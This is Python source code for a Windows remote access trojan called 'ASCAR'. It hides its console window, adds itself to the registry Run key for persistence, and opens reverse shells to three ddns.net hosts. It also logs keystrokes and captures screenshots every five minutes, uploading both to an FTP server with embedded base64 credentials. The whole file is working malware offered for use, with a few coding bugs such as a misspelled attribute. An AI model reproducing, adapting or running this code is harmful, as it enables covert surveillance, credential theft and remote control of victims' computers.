import os, sys, win32console, win32gui, socket, subprocess,  time, threading, hashlib, ftplib, pythoncom, pyHook, win32api
import pyscreenshot as ImageGrab

class program(object):
	"""This class is responsible for holding important program information."""
	def __init__(self, name, version, ctime, dns_list, dns_port):
		super(program, self).__init__()
		self.name = name
		self.version = version
		self.ctime = ctime
		self.dns_list = dns_list
		self.dns_port = int(dns_port)

	def initialization(self, name, version, ctime):
		print str(name) + ' v.' + str(version) + ' started at ' + str(ctime) + '.'
		if(debug_mode == False):
			print '	Debug Mode: OFF'
		if(debug_mode == True):
			print '	Debug Mode: ON'
		

class module(object):
	"""This class is responsible for Module's informations."""
	def __init__(self, module_list):
		super(Module, self).__init__()
		self.module_list = module_list

	class fileTransferProtocol(object):
		"""This module is responsible for ftp operations algorithms."""
		def __init__(self, host, port, user, password):
			self.host = host
			self.port = port
			self.user = str(user).decode('base64')
			self.password = str(password).decode('base64')

		def screenshot(self, host, port, user, password):
			global ftp
			ftp = ftplib.FTP()
			ftp.connect(host,port)
			ftp.login(user,password)
			print ' [+] FTP: Connected to %s:%s' % (str(host),str(port))
			ftp.cwd('Furnace')
			pc_name = str(os.environ['COMPUTERNAME'])
			fileName = pc_name + '_' + str(str(time.ctime()).replace(' ','_')).replace(':','') + '.jpg'
			im = ImageGrab.grab_to_file(fileName)
			try:
				ftp.cwd(pc_name)
			except:
				ftp.mkd(pc_name)
				ftp.cwd(pc_name)
			module.fileTransferProtocol.upload(fileName)
			print [' [+] Screenshot: "' + str(fileName) + '" upload sucess.']
			ftp.close()

			return True

		def keylogger(self, host, port, user, password):
			while 1:
				global buffer
				buffer = ''

				def OnKeyboardEvent(event):
					#print 'MessageName:', event.MessageName
					#print 'Message:',event.Message
					#print 'Time:',event.Time
					#print 'Window:',event.Window
					#print 'WindowName:',event.WindowName
					#print 'Ascii:', event.Ascii, chr(event.Ascii)
					#print 'Key:', event.Key
					#print 'KeyID:', event.KeyID
					#print 'ScanCode:', event.ScanCode
					#print 'Extended:', event.Extended
					#print 'Injected:', event.Injected
					#print 'Alt', event.Alt
					#print 'Transition', event.Transition
					#print '---'

					if event.Ascii < 256 or event.Ascii <> 0:
						global buffer
						fileName = str(str(time.ctime()).replace(' ','_')).replace(':','') + '.keys'
						print 'ASCII Event Number: ' + str(event.Ascii)
						if event.Ascii==5:
							_exit(1)
						if event.Ascii !=0 or 8:	
							keylogs=chr(event.Ascii)
							print 'Key Pressed: ' + str(keylogs)
							if event.Ascii==13:
								keylogs='/n'
							buffer+=keylogs
							print 'Actual Buffer Lenght: ' + str(len(buffer))
							if(len(buffer) > 100):
								pc_name = str(os.environ['COMPUTERNAME'])
								global ftp
								ftp = ftplib.FTP()
								ftp.connect(host,port)
								ftp.login(user,password)
								print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
								ftp.cwd('Furnace')
								f=open(fileName,'w')
								f.write(buffer)
								f.close()
								buffer = ''
								try:
									ftp.cwd(pc_name)
								except:
									ftp.mkd(pc_name)
									ftp.cwd(pc_name)
								module.fileTransferProtocol.upload(fileName)
								print [' [+] Keylogger: "' + str(fileName) + '" upload sucess.']
								ftp.close()

				# create a hook manager object
				hm=pyHook.HookManager()
				hm.KeyDown=OnKeyboardEvent
				# set the hook
				hm.HookKeyboard()
				# wait forever
				pythoncom.PumpMessages()

		@classmethod
		def download(self, fileName):
			global ftp
			ftp = ftplib.FTP()
			ftp.connect(host,port)
			ftp.login(user,password)
			print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
			f = open(fileName, 'wb')
			ftp.retrbinary('RETR ' + str(fileName), f.write)
			f.close()
			return True

		@classmethod
		def upload(self, fileName):
			if(os.path.isfile(fileName)):
				ftp.storbinary('STOR ' + str(fileName), open(fileName, 'rb'))
			else:
				print 'Could not find %s or is not a file.' % (str(fileName))
				return False

		def listDir():
			ftp.dir()


	class thread(object):
		"""This module is responsible for threading operations algorithms."""
		def __init__(self):
			super(thread, self).__init__()

		@classmethod
		def start(self, function_name,args):
			str_function_name = str(function_name)
			print ' [+] Thread: ' + str_function_name + ' starting...'
			t = threading.Thread(target=function_name, args=tuple(args))
			try:
				t.start()
			except Exception as e:
				fileName = 'error_log_' + str(time.ctime()) + '.txt'
				f = open(fileName,'w')
				f.write(e)
				f.close()
				print ' [!] Error: ' + str(e)
				print '\nLog: ' + str(fileName)
			print ' [*] Thread: ' + str_function_name + ' started.'
			


	class registry(object):
		"""This module is responsible for registry operations algorithms."""
		def __init__(self):
			super(registry, self).__init__()

		@classmethod
		def install(self, p_name):
			name = module.encryption.toSHA256(str(p_name))
			command = 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "' + str(name) + '" /t REG_SZ /F /D "' + str(os.path.realpath(sys.argv[0])) + '"'
			try:
				os.system(command)
			except Exception as e:
				fileName = 'error_log_' + str(time.ctime()) + '.txt'
				f = open(fileName,'w')
				f.write(e)
				f.close()
				print ' [!] Error: ' + str(e)
				print '\nLog: ' + str(fileName)

	class stealth(object):
		"""This module is resposible for stealth algorithms."""
		def __init__(self):
			super(stealth, self).__init__()

		@classmethod
		def hide(self):
			window = win32console.GetConsoleWindow()
			win32gui.ShowWindow(window,0)
			return True

	class encryption(object):
		"""This module is responsible for encryption algorithms."""
		def __init__(self):
			super(encryption, self).__init__()

		@classmethod
		def toSHA256(self, string):
			h = hashlib.sha256()
			h.update(string)
			target = h.hexdigest()
			return str(target)
			
	class socket(object):
		"""This module is responsible for socket algorithms."""
		def __init__(self):
			super(socket, self).__init__()

		@classmethod
		def connect(self, host, port):
			try:
				s = socket.socket()
				s.connect((str(host), int(port)))
				while 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())
			except Exception as e:
				print str(e)
				time.sleep(15)
				print 'Retrying connection to ' + str(host) + ':' + str(port) + ' in ' + ' 3 seconds...'
				time.sleep(3)
				module.socket.connect(str(host), int(port))
			

def main():
	global debug_mode

	#DEBUG MODE
	debug_mode = False


	#CONTROLSWITCH
	socketMode = True
	ftpMode = True


	#START PROGRAM
	dns_list = ['nest0r.ddns.net','lyriumhideout.ddns.net','escaserver.ddns.net']
	local_list = ['127.0.0.1']
	p = program('ASCAR','0.1.1',str(time.ctime()),dns_list,8624)
	p.initialization(p.name, p.version, p.ctime)


	#install on Registry "RUN"
	if(debug_mode == False):
		module.stealth.hide()
		module.registry.install(p.name)


	if(socketMode == True):
		#start Socket conn
		if(debug_mode == False):
			for dns in dns_list:
				module.thread.start(module.socket.connect,(dns,p.dns_port))
		else:
			for dns in local_list:
				module.thread.start(module.socket.connect,(dns,p.dns_poWrt))

	if(ftpMode == True):
		#start FTP conn
		fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
		module.thread.start(fp.keylogger,(fp.host,fp.port, fp.user, fp.password))

		while 1:
			module.thread.start(fp.screenshot,(fp.host,fp.port, fp.user, fp.password))
			time.sleep(300)

if __name__ == '__main__':
	main()